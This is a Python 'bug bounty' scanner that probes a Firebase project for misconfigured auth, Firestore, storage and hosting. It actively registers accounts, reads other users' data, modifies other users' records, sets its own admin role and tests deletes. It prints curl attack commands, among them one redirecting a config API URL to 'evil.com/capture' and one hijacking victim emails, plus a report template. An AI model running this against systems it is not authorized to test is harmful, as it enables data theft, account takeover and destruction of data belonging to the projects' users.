#!/usr/bin/env python3
"""
Firebase Security Scanner - Complete Bug Bounty Tool v3.0
Tests: Auth, Leaks, Read, Write, Delete, IDOR, CSP, Storage, RTDB, Config, CORS, JWT & More
"""

import requests
import sys
import base64
import json
from datetime import datetime

class Colors:
    CRITICAL = '\033[91m'
    HIGH = '\033[93m'
    SUCCESS = '\033[92m'
    INFO = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class FirebaseScanner:
    def __init__(self):
        self.api_key = None
        self.project_id = None
        self.storage_bucket = None
        self.app_url = None
        self.token = None
        self.user_uid = None
        self.user_email = None
        self.findings = []
        self.curl_commands = []

    def banner(self):
        print(f"""
{Colors.CRITICAL}╔══════════════════════════════════════════════════════════════════════╗
║     ███████╗██╗██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗ ║
║     ██╔════╝██║██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║ ║
║     █████╗  ██║██████╔╝█████╗      ███████╗██║     ███████║██╔██╗ ██║ ║
║     ██╔══╝  ██║██╔══██╗██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║ ║
║     ██║     ██║██║  ██║███████╗    ███████║╚██████╗██║  ██║██║ ╚████║ ║
║     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ║
║                    Firebase Security Scanner v3.0                     ║
║                         Bug Bounty Edition                            ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """)

    def get_config(self):
        print(f"{Colors.INFO}[*] Enter Firebase Configuration{Colors.RESET}\n")
        print("    (Paste from source code - only API Key & Project ID required)\n")

        self.api_key = input("    API Key: ").strip().replace('"', '').replace(',', '').replace("'", "")
        if not self.api_key:
            print("[!] API Key is required!")
            sys.exit(1)

        self.project_id = input("    Project ID: ").strip().replace('"', '').replace(',', '').replace("'", "")
        if not self.project_id:
            print("[!] Project ID is required!")
            sys.exit(1)

        self.storage_bucket = input("    Storage Bucket (Enter to skip): ").strip().replace('"', '').replace(',', '')
        if not self.storage_bucket:
            self.storage_bucket = f"{self.project_id}.appspot.com"

        self.app_url = input("    App URL (Enter to skip): ").strip()

        print(f"\n{Colors.SUCCESS}[+] Configuration:{Colors.RESET}")
        print(f"    Project: {self.project_id}")
        print(f"    Bucket:  {self.storage_bucket}")
        if self.app_url:
            print(f"    App URL: {self.app_url}")

    def log(self, level, msg):
        colors = {
            "CRITICAL": Colors.CRITICAL,
            "HIGH": Colors.HIGH,
            "VULN": Colors.CRITICAL,
            "OK": Colors.SUCCESS,
            "INFO": Colors.INFO,
            "SKIP": Colors.INFO,
            "FOUND": Colors.HIGH
        }
        color = colors.get(level, Colors.RESET)
        print(f"    {color}[{level}]{Colors.RESET} {msg}")

    def add_finding(self, severity, vuln_type, title, description, curl_cmd=None, impact=None):
        self.findings.append({
            "severity": severity,
            "type": vuln_type,
            "title": title,
            "description": description,
            "impact": impact
        })
        if curl_cmd:
            self.curl_commands.append({"title": title, "command": curl_cmd})

    # ==================== TEST 1: OPEN REGISTRATION ====================
    def test_registration(self):
        print(f"\n{Colors.INFO}[1/18] Testing Open Registration...{Colors.RESET}")

        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
        test_email = f"scanner_{datetime.now().strftime('%H%M%S')}@security-test.com"
        self.user_email = test_email
        payload = {"email": test_email, "password": "ScannerTest123!", "returnSecureToken": True}

        curl = f'''curl -X POST "{url}" \\
  -H "Content-Type: application/json" \\
  -d '{{"email": "attacker@example.com", "password": "Password123!", "returnSecureToken": true}}'
'''
        try:
            r = requests.post(url, json=payload, timeout=10)
            if r.status_code == 200:
                data = r.json()
                self.token = data.get("idToken")
                self.user_uid = data.get("localId")
                self.log("VULN", f"Open registration ENABLED!")
                self.add_finding("INFO", "AUTH", "Open Registration",
                    "Anyone can register without restrictions - entry point for attacks", curl)
                return True
            else:
                self.log("OK", "Registration restricted")
                return False
        except Exception as e:
            self.log("INFO", f"Error: {e}")
            return False

    # ==================== TEST 2: EMAIL ENUMERATION ====================
    def test_email_enumeration(self):
        print(f"\n{Colors.INFO}[2/18] Testing Email Enumeration...{Colors.RESET}")

        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={self.api_key}"

        # Test with likely non-existent email
        fake_email = f"definitely_not_exists_{datetime.now().strftime('%H%M%S')}@test.com"
        payload1 = {"email": fake_email, "password": "wrong", "returnSecureToken": True}

        # Test with common email pattern
        common_email = "admin@gmail.com"
        payload2 = {"email": common_email, "password": "wrong", "returnSecureToken": True}

        try:
            r1 = requests.post(url, json=payload1, timeout=10)
            r2 = requests.post(url, json=payload2, timeout=10)

            err1 = r1.json().get("error", {}).get("message", "")
            err2 = r2.json().get("error", {}).get("message", "")

            # If errors are different, enumeration is possible
            if err1 != err2 or "EMAIL_NOT_FOUND" in err1 or "EMAIL_NOT_FOUND" in err2:
                self.log("VULN", f"Email enumeration possible!")
                self.log("INFO", f"Non-existent: '{err1}' vs Existing: '{err2}'")
                curl = f'''# Test if email exists
curl -X POST "{url}" \\
  -H "Content-Type: application/json" \\
  -d '{{"email": "target@example.com", "password": "x", "returnSecureToken": true}}'

# EMAIL_NOT_FOUND = doesn't exist
# INVALID_PASSWORD = exists!
'''
                self.add_finding("LOW", "ENUM", "Email Enumeration",
                    "Different error messages reveal if email is registered",
                    curl, "Account enumeration, targeted phishing")
            else:
                self.log("OK", "Email enumeration not obvious")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

    # ==================== TEST 3: WEAK PASSWORD POLICY ====================
    def test_weak_password(self):
        print(f"\n{Colors.INFO}[3/18] Testing Password Policy...{Colors.RESET}")

        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
        weak_passwords = ["123456", "password", "111111", "abc123"]

        for weak in weak_passwords:
            test_email = f"weakpass_{datetime.now().strftime('%H%M%S%f')}@test.com"
            payload = {"email": test_email, "password": weak, "returnSecureToken": True}
            try:
                r = requests.post(url, json=payload, timeout=5)
                if r.status_code == 200:
                    self.log("VULN", f"Weak password '{weak}' accepted!")
                    self.add_finding("LOW", "AUTH", "Weak Password Policy",
                        f"Password '{weak}' was accepted - no complexity requirements",
                        None, "Brute force attacks, credential stuffing")
                    return
            except:
                pass

        self.log("OK", "Weak passwords rejected")

    # ==================== TEST 4: PASSWORD RESET ====================
    def test_password_reset(self):
        print(f"\n{Colors.INFO}[4/18] Testing Password Reset...{Colors.RESET}")

        url = f"https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={self.api_key}"
        payload = {"requestType": "PASSWORD_RESET", "email": "test@test.com"}

        curl = f'''# Trigger password reset
curl -X POST "{url}" \\
  -H "Content-Type: application/json" \\
  -d '{{"requestType": "PASSWORD_RESET", "email": "victim@example.com"}}'
'''
        try:
            r = requests.post(url, json=payload, timeout=10)
            if r.status_code == 200:
                self.log("INFO", "Password reset endpoint accessible")
                # Check if email is revealed in response
                if "email" in r.text:
                    self.log("VULN", "Email confirmed in reset response!")
                    self.add_finding("LOW", "AUTH", "Password Reset Info Leak",
                        "Password reset confirms email existence",
                        curl, "Email enumeration via reset")
            else:
                self.log("OK", f"Reset blocked ({r.status_code})")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

    # ==================== TEST 5: JWT TOKEN ANALYSIS ====================
    def test_jwt_analysis(self):
        print(f"\n{Colors.INFO}[5/18] Analyzing JWT Token...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token available")
            return

        try:
            # Decode JWT (without verification)
            parts = self.token.split('.')
            if len(parts) == 3:
                # Decode header
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                # Decode payload
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

                self.log("INFO", f"Token Algorithm: {header.get('alg', 'unknown')}")
                self.log("INFO", f"User ID: {payload.get('user_id', 'N/A')}")
                self.log("INFO", f"Email: {payload.get('email', 'N/A')}")
                self.log("INFO", f"Email Verified: {payload.get('email_verified', 'N/A')}")
                self.log("INFO", f"Auth Provider: {payload.get('firebase', {}).get('sign_in_provider', 'N/A')}")

                # Check for interesting claims
                if payload.get('admin') or payload.get('is_admin') or payload.get('role'):
                    self.log("VULN", f"Custom claims found: admin={payload.get('admin')}, role={payload.get('role')}")

                exp = payload.get('exp', 0)
                iat = payload.get('iat', 0)
                token_lifetime = exp - iat
                self.log("INFO", f"Token lifetime: {token_lifetime} seconds ({token_lifetime//3600}h)")

                if token_lifetime > 86400:  # More than 24 hours
                    self.log("HIGH", "Long token lifetime detected!")
        except Exception as e:
            self.log("INFO", f"JWT decode error: {e}")

    # ==================== TEST 6: FIRESTORE READ (DATA LEAK) ====================
    def test_firestore_read(self):
        print(f"\n{Colors.INFO}[6/18] Testing Firestore READ Access (Data Leak)...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        collections = [
            "users", "app_config", "configs", "settings", "products", "orders",
            "payments", "transactions", "customers", "admin", "secrets", "api_keys",
            "tokens", "sessions", "logs", "messages", "notifications", "feedback",
            "addresses", "cards", "profiles", "accounts", "inventory", "analytics",
            "reports", "audit", "credentials", "keys", "config", "metadata",
            "employees", "staff", "internal", "private", "restricted", "sensitive"
        ]

        headers = {"Authorization": f"Bearer {self.token}"}
        readable = []
        total_docs = 0
        pii_found = []

        for coll in collections:
            url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{coll}"
            try:
                r = requests.get(url, headers=headers, timeout=5)
                if r.status_code == 200:
                    docs = r.json().get("documents", [])
                    if docs:
                        readable.append({"name": coll, "count": len(docs)})
                        total_docs += len(docs)
                        self.log("VULN", f"'{coll}' READABLE - {len(docs)} documents")

                        # Deep PII check
                        for doc in docs[:3]:
                            fields = doc.get("fields", {})
                            fields_str = str(fields).lower()
                            for pii in ["email", "phone", "address", "ssn", "password", "card", "dob", "phone_number", "credit", "social", "birth", "salary", "bank"]:
                                if pii in fields_str:
                                    pii_found.append(pii)
            except:
                pass

        if readable:
            curl = f'''# Enumerate collection data
curl -X GET "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users" \\
  -H "Authorization: Bearer $TOKEN"
'''
            pii_list = list(set(pii_found)) if pii_found else ["manual check needed"]
            self.add_finding("HIGH", "DATA_LEAK", "Firestore Data Exposure",
                f"{len(readable)} collections readable, {total_docs} documents. PII: {pii_list}",
                curl, "Mass data exposure, GDPR/privacy violation")
        else:
            self.log("OK", "No collections accessible")

    # ==================== TEST 7: FIRESTORE WRITE ====================
    def test_firestore_write(self):
        print(f"\n{Colors.INFO}[7/18] Testing Firestore WRITE Access...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        headers = {"Authorization": f"Bearer {self.token}"}
        test_colls = ["users", "app_config", "configs", "products", "feedback"]
        writable = []

        for coll in test_colls:
            url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{coll}?documentId=_scanner_test_{datetime.now().strftime('%H%M%S')}"
            payload = {"fields": {"_test": {"stringValue": "scanner"}}}
            try:
                r = requests.post(url, headers=headers, json=payload, timeout=5)
                if r.status_code in [200, 201]:
                    writable.append(coll)
                    self.log("VULN", f"'{coll}' is WRITABLE!")
                    # Cleanup
                    doc_name = r.json().get("name", "")
                    if doc_name:
                        requests.delete(f"https://firestore.googleapis.com/v1/{doc_name}", headers=headers)
            except:
                pass

        if writable:
            curl = f'''# Create/modify document
curl -X PATCH "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/VICTIM_ID" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{{"fields": {{"email": {{"stringValue": "hijacked@evil.com"}}}}}}'
'''
            self.add_finding("CRITICAL", "WRITE", "Firestore Write Access",
                f"Writable collections: {writable}",
                curl, "Data manipulation, account takeover")

    # ==================== TEST 8: IDOR/BOLA ====================
    def test_idor(self):
        print(f"\n{Colors.INFO}[8/18] Testing IDOR/BOLA (Access Other Users)...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        headers = {"Authorization": f"Bearer {self.token}"}
        url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users"

        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                docs = r.json().get("documents", [])
                other_users = [d for d in docs if self.user_uid and self.user_uid not in d.get("name", "")]

                if other_users:
                    self.log("CRITICAL", f"IDOR! Can access {len(other_users)} OTHER users!")

                    # Try modify
                    victim_path = other_users[0].get("name", "").split("documents/")[-1]
                    if victim_path:
                        mod_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{victim_path}"
                        r2 = requests.patch(mod_url, headers=headers, json={"fields": {"_idor_test": {"stringValue": "x"}}}, timeout=5)
                        if r2.status_code == 200:
                            self.log("CRITICAL", "Can MODIFY other users!")

                    curl = f'''# Read other user
curl -X GET "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/VICTIM_ID" \\
  -H "Authorization: Bearer $TOKEN"

# Modify other user
curl -X PATCH "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/VICTIM_ID" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{{"fields": {{"email": {{"stringValue": "attacker@evil.com"}}}}}}'
'''
                    self.add_finding("CRITICAL", "IDOR", "IDOR/BOLA - Access Other Users",
                        f"Can access {len(other_users)} other users' data",
                        curl, "Account takeover, mass data breach")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

    # ==================== TEST 9: DELETE ====================
    def test_delete(self):
        print(f"\n{Colors.INFO}[9/18] Testing DELETE Access...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        headers = {"Authorization": f"Bearer {self.token}"}
        doc_id = f"_delete_test_{datetime.now().strftime('%H%M%S')}"

        # Create then delete
        create_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users?documentId={doc_id}"
        requests.post(create_url, headers=headers, json={"fields": {"x": {"stringValue": "x"}}}, timeout=5)

        del_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/{doc_id}"
        try:
            r = requests.delete(del_url, headers=headers, timeout=5)
            if r.status_code == 200:
                self.log("CRITICAL", "DELETE allowed!")
                curl = f'''# Delete document
curl -X DELETE "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/TARGET_ID" \\
  -H "Authorization: Bearer $TOKEN"
'''
                self.add_finding("CRITICAL", "DELETE", "Data Destruction Possible",
                    "Any authenticated user can DELETE documents",
                    curl, "Ransomware, data wipe, business disruption")
            else:
                self.log("OK", "Delete blocked")
        except:
            pass

    # ==================== TEST 10: CONFIG HIJACK ====================
    def test_config_hijack(self):
        print(f"\n{Colors.INFO}[10/18] Testing Config Hijack...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        headers = {"Authorization": f"Bearer {self.token}"}
        config_paths = ["app_config/current", "configs/production", "config/settings", "settings/app", "config/main"]

        for path in config_paths:
            url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{path}"
            try:
                r = requests.get(url, headers=headers, timeout=5)
                if r.status_code == 200:
                    fields = r.json().get("fields", {})
                    sensitive = [k for k in fields.keys() if any(x in k.lower() for x in ["url", "api", "endpoint", "host", "admin", "key", "secret", "base"])]

                    if sensitive:
                        self.log("CRITICAL", f"Config '{path}' readable! Fields: {sensitive}")

                        # Test write
                        test_url = f"{url}?updateMask.fieldPaths=_scanner_test"
                        r2 = requests.patch(test_url, headers=headers, json={"fields": {"_scanner_test": {"stringValue": "x"}}}, timeout=5)
                        if r2.status_code == 200:
                            self.log("CRITICAL", "Config WRITABLE - API hijack possible!")

                        curl = f'''# Read config
curl -X GET "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{path}" \\
  -H "Authorization: Bearer $TOKEN"

# Hijack API URL
curl -X PATCH "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{path}?updateMask.fieldPaths=api_base_url" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{{"fields": {{"api_base_url": {{"stringValue": "https://evil.com/capture"}}}}}}'
'''
                        self.add_finding("CRITICAL", "CONFIG", "Config Hijack",
                            f"Config '{path}' writable. Sensitive fields: {sensitive}",
                            curl, "Redirect all traffic, credential theft")
                        return
            except:
                pass

    # ==================== TEST 11: PRIVILEGE ESCALATION ====================
    def test_privesc(self):
        print(f"\n{Colors.INFO}[11/18] Testing Privilege Escalation...{Colors.RESET}")

        if not self.token or not self.user_uid:
            self.log("SKIP", "No token/UID")
            return

        headers = {"Authorization": f"Bearer {self.token}"}
        url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/{self.user_uid}"

        payload = {"fields": {"is_admin": {"booleanValue": True}, "role": {"stringValue": "admin"}}}
        try:
            r = requests.patch(url, headers=headers, json=payload, timeout=5)
            if r.status_code == 200:
                self.log("CRITICAL", "Can set admin privileges!")
                curl = f'''# Escalate to admin
curl -X PATCH "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/{self.user_uid}" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{{"fields": {{"is_admin": {{"booleanValue": true}}, "role": {{"stringValue": "superadmin"}}}}}}'
'''
                self.add_finding("HIGH", "PRIVESC", "Privilege Escalation",
                    "Can modify own admin/role fields",
                    curl, "Gain admin access")
        except:
            pass

    # ==================== TEST 12: STORAGE ====================
    def test_storage(self):
        print(f"\n{Colors.INFO}[12/18] Testing Firebase Storage...{Colors.RESET}")

        url = f"https://firebasestorage.googleapis.com/v0/b/{self.storage_bucket}/o"

        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                items = r.json().get("items", [])
                self.log("CRITICAL", f"Storage PUBLIC! {len(items)} files")

                # Check for sensitive files
                sensitive_ext = ['.env', '.json', '.sql', '.bak', '.key', '.pem']
                sensitive_files = [i.get('name', '') for i in items if any(i.get('name', '').endswith(ext) for ext in sensitive_ext)]
                if sensitive_files:
                    self.log("CRITICAL", f"Sensitive files: {sensitive_files[:5]}")

                curl = f'''# List storage
curl "https://firebasestorage.googleapis.com/v0/b/{self.storage_bucket}/o"

# Download file
curl "https://firebasestorage.googleapis.com/v0/b/{self.storage_bucket}/o/path%2Ffile.jpg?alt=media"
'''
                self.add_finding("HIGH", "STORAGE", "Storage Bucket Exposed",
                    f"{len(items)} files publicly accessible",
                    curl, "Data leak, sensitive file exposure")
            else:
                self.log("OK", f"Public listing blocked ({r.status_code})")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

        # Test upload
        if self.token:
            self.test_storage_upload()

    def test_storage_upload(self):
        print(f"    {Colors.INFO}[+] Testing Storage Upload...{Colors.RESET}")

        headers = {"Authorization": f"Bearer {self.token}"}
        upload_url = f"https://firebasestorage.googleapis.com/v0/b/{self.storage_bucket}/o?name=_scanner_test.txt"

        try:
            r = requests.post(upload_url, headers=headers, data="security test", timeout=10)
            if r.status_code == 200:
                self.log("CRITICAL", "Can UPLOAD files to storage!")
                # Cleanup
                file_url = f"https://firebasestorage.googleapis.com/v0/b/{self.storage_bucket}/o/_scanner_test.txt"
                requests.delete(file_url, headers=headers)

                self.add_finding("CRITICAL", "STORAGE_UPLOAD", "Storage Upload Allowed",
                    "Any authenticated user can upload files",
                    None, "Malware hosting, shell upload potential")
        except:
            pass

    # ==================== TEST 13: REALTIME DATABASE ====================
    def test_rtdb(self):
        print(f"\n{Colors.INFO}[13/18] Testing Realtime Database...{Colors.RESET}")

        urls = [
            f"https://{self.project_id}.firebaseio.com/.json",
            f"https://{self.project_id}-default-rtdb.firebaseio.com/.json"
        ]

        for url in urls:
            try:
                r = requests.get(url, timeout=10)
                if r.status_code == 200 and r.text not in ["null", "{}"]:
                    self.log("CRITICAL", "RTDB PUBLICLY READABLE!")
                    curl = f'''# Read RTDB
curl "{url}"
'''
                    self.add_finding("CRITICAL", "RTDB", "Realtime Database Exposed",
                        "RTDB allows unauthenticated read",
                        curl, "Complete database exposure")
                    return
                elif r.status_code == 401:
                    self.log("OK", "RTDB requires auth")
            except:
                pass

    # ==================== TEST 14: SENSITIVE FILES (HOSTING) ====================
    def test_sensitive_files(self):
        print(f"\n{Colors.INFO}[14/18] Testing Sensitive File Exposure...{Colors.RESET}")

        if not self.app_url:
            # Try default hosting URL
            self.app_url = f"https://{self.project_id}.web.app"

        base = self.app_url.rstrip('/')

        sensitive_paths = [
            "/.env", "/.env.local", "/.env.production",
            "/.git/config", "/.git/HEAD",
            "/config.json", "/config.js",
            "/firebase.json", "/.firebaserc",
            "/package.json", "/package-lock.json",
            "/main.dart.js.map", "/main.js.map",
            "/__/firebase/init.json",  # Firebase reserved URL
            "/api/config", "/api/debug",
            "/.well-known/security.txt",
            "/robots.txt", "/sitemap.xml",
            "/backup.sql", "/dump.sql",
            "/debug.log", "/error.log"
        ]

        found = []
        for path in sensitive_paths:
            try:
                r = requests.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and len(r.text) > 10:
                    # Check if it's not a generic 404 page
                    if "<!DOCTYPE" not in r.text[:100] and "Page Not Found" not in r.text:
                        found.append(path)
                        self.log("FOUND", f"{path} accessible!")

                        # Special handling for Firebase init.json
                        if "firebase/init.json" in path:
                            self.log("INFO", f"Firebase config exposed: {r.text[:200]}")
            except:
                pass

        if found:
            curl = f'''# Check sensitive files
curl "{base}/.env"
curl "{base}/__/firebase/init.json"
curl "{base}/.git/config"
'''
            self.add_finding("MEDIUM", "FILES", "Sensitive Files Exposed",
                f"Accessible files: {found}",
                curl, "Config leak, source code exposure")

    # ==================== TEST 15: SOURCE MAPS ====================
    def test_source_maps(self):
        print(f"\n{Colors.INFO}[15/18] Testing Source Map Exposure...{Colors.RESET}")

        if not self.app_url:
            self.log("SKIP", "No app URL")
            return

        base = self.app_url.rstrip('/')
        map_paths = [
            "/main.dart.js.map",
            "/main.js.map",
            "/bundle.js.map",
            "/app.js.map",
            "/vendor.js.map",
            "/static/js/main.js.map"
        ]

        for path in map_paths:
            try:
                r = requests.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and "mappings" in r.text:
                    self.log("VULN", f"Source map found: {path}")
                    self.add_finding("MEDIUM", "SOURCEMAP", "Source Maps Exposed",
                        f"Source map at {path} reveals original source code",
                        f'curl "{base}{path}"', "Source code leak, reverse engineering")
                    return
            except:
                pass

        self.log("OK", "No source maps found")

    # ==================== TEST 16: CORS ====================
    def test_cors(self):
        print(f"\n{Colors.INFO}[16/18] Testing CORS Configuration...{Colors.RESET}")

        if not self.app_url:
            self.log("SKIP", "No app URL")
            return

        headers = {"Origin": "https://evil-attacker.com"}
        try:
            r = requests.get(self.app_url, headers=headers, timeout=10)
            cors_header = r.headers.get("Access-Control-Allow-Origin", "")

            if cors_header == "*":
                self.log("VULN", "CORS allows any origin (*)!")
                self.add_finding("MEDIUM", "CORS", "Permissive CORS",
                    "Access-Control-Allow-Origin: * allows any website",
                    None, "Cross-origin data theft")
            elif "evil-attacker.com" in cors_header:
                self.log("VULN", "CORS reflects arbitrary origin!")
                self.add_finding("HIGH", "CORS", "CORS Origin Reflection",
                    "Server reflects attacker's origin in CORS header",
                    None, "Cross-origin data theft")
            else:
                self.log("OK", f"CORS: {cors_header if cors_header else 'Not set'}")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

    # ==================== TEST 17: SECURITY HEADERS ====================
    def test_security_headers(self):
        print(f"\n{Colors.INFO}[17/18] Testing Security Headers...{Colors.RESET}")

        if not self.app_url:
            self.log("SKIP", "No app URL")
            return

        try:
            r = requests.get(self.app_url, timeout=10)
            headers_lower = {k.lower(): v for k, v in r.headers.items()}

            required_headers = {
                "content-security-policy": "CSP",
                "x-frame-options": "Clickjacking protection",
                "x-content-type-options": "MIME sniffing protection",
                "strict-transport-security": "HSTS",
                "x-xss-protection": "XSS filter"
            }

            missing = []
            for header, desc in required_headers.items():
                if header not in headers_lower:
                    missing.append(f"{header} ({desc})")

            if missing:
                self.log("VULN", f"Missing: {[m.split(' ')[0] for m in missing]}")
                curl = f'curl -I "{self.app_url}"'
                self.add_finding("MEDIUM", "HEADERS", "Missing Security Headers",
                    f"Missing: {', '.join(missing)}",
                    curl, "XSS, clickjacking, MIME attacks")
            else:
                self.log("OK", "All security headers present")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

    # ==================== TEST 18: FIREBASE REMOTE CONFIG ====================
    def test_remote_config(self):
        print(f"\n{Colors.INFO}[18/18] Testing Firebase Remote Config...{Colors.RESET}")

        url = f"https://firebaseremoteconfig.googleapis.com/v1/projects/{self.project_id}/remoteConfig"

        if self.token:
            headers = {"Authorization": f"Bearer {self.token}"}
            try:
                r = requests.get(url, headers=headers, timeout=10)
                if r.status_code == 200:
                    self.log("CRITICAL", "Remote Config readable!")
                    self.add_finding("HIGH", "REMOTECONFIG", "Remote Config Exposed",
                        "Firebase Remote Config accessible with user token",
                        f'curl -H "Authorization: Bearer $TOKEN" "{url}"',
                        "Feature flags, secrets exposure")
                else:
                    self.log("OK", f"Remote Config protected ({r.status_code})")
            except:
                pass

    # ==================== REPORT ====================
    def generate_report(self):
        print(f"\n{'='*75}")
        print(f"{Colors.CRITICAL}{Colors.BOLD}                           SCAN RESULTS{Colors.RESET}")
        print(f"{'='*75}")

        if not self.findings:
            print(f"\n{Colors.SUCCESS}[+] No vulnerabilities found!{Colors.RESET}")
            return

        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        self.findings.sort(key=lambda x: severity_order.get(x["severity"], 5))

        crit = len([f for f in self.findings if f["severity"] == "CRITICAL"])
        high = len([f for f in self.findings if f["severity"] == "HIGH"])
        med = len([f for f in self.findings if f["severity"] == "MEDIUM"])
        low = len([f for f in self.findings if f["severity"] == "LOW"])

        print(f"\n{Colors.CRITICAL}CRITICAL: {crit}  {Colors.HIGH}HIGH: {high}  {Colors.INFO}MEDIUM: {med}  LOW: {low}{Colors.RESET}\n")

        for f in self.findings:
            sev = f["severity"]
            color = Colors.CRITICAL if sev in ["CRITICAL"] else Colors.HIGH if sev == "HIGH" else Colors.INFO
            print(f"{color}[{sev}] {f['type']}: {f['title']}{Colors.RESET}")
            print(f"       {f['description']}")
            if f.get("impact"):
                print(f"       Impact: {f['impact']}")
            print()

        # Curl commands
        print(f"\n{'='*75}")
        print(f"{Colors.INFO}{Colors.BOLD}                          CURL COMMANDS{Colors.RESET}")
        print(f"{'='*75}")

        print(f"""
{Colors.SUCCESS}### STEP 0: Get Token ###{Colors.RESET}
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}" \\
  -H "Content-Type: application/json" \\
  -d '{{"email": "attacker@test.com", "password": "Password123!", "returnSecureToken": true}}'

export TOKEN="<idToken from response>"
""")

        for cmd in self.curl_commands:
            print(f"\n{Colors.HIGH}### {cmd['title']} ###{Colors.RESET}")
            print(cmd['command'])

        # Report template
        if crit > 0 or high > 0:
            self.print_report_template()

    def print_report_template(self):
        print(f"\n{'='*75}")
        print(f"{Colors.SUCCESS}{Colors.BOLD}                    BUG BOUNTY REPORT TEMPLATE{Colors.RESET}")
        print(f"{'='*75}")

        top = self.findings[0]
        print(f"""
## Title
{top['title']} in Firebase Project {self.project_id}

## Severity
{top['severity']}

## VRT
Broken Access Control (BAC) > Insecure Direct Object References (IDOR)

## Summary
The Firebase project `{self.project_id}` has insecure security rules.

## Impact
{top.get('impact', top['description'])}

## Steps to Reproduce
1. Register: POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}
2. Use idToken as Bearer authentication
3. [See curl commands above]

## Remediation
```javascript
rules_version = '2';
service cloud.firestore {{
  match /databases/{{database}}/documents {{
    match /users/{{userId}} {{
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }}
    match /app_config/{{doc}} {{
      allow read: if true;
      allow write: if false;
    }}
  }}
}}
```
""")

    def run(self):
        self.banner()
        self.get_config()

        print(f"\n{'='*75}")
        print(f"{Colors.INFO}{Colors.BOLD}                    STARTING SECURITY SCAN{Colors.RESET}")
        print(f"{'='*75}")

        self.test_registration()
        self.test_email_enumeration()
        self.test_weak_password()
        self.test_password_reset()
        self.test_jwt_analysis()
        self.test_firestore_read()
        self.test_firestore_write()
        self.test_idor()
        self.test_delete()
        self.test_config_hijack()
        self.test_privesc()
        self.test_storage()
        self.test_rtdb()
        self.test_sensitive_files()
        self.test_source_maps()
        self.test_cors()
        self.test_security_headers()
        self.test_remote_config()

        self.generate_report()
        print(f"\n{Colors.SUCCESS}[*] Scan complete!{Colors.RESET}\n")


if __name__ == "__main__":
    scanner = FirebaseScanner()
    scanner.run()
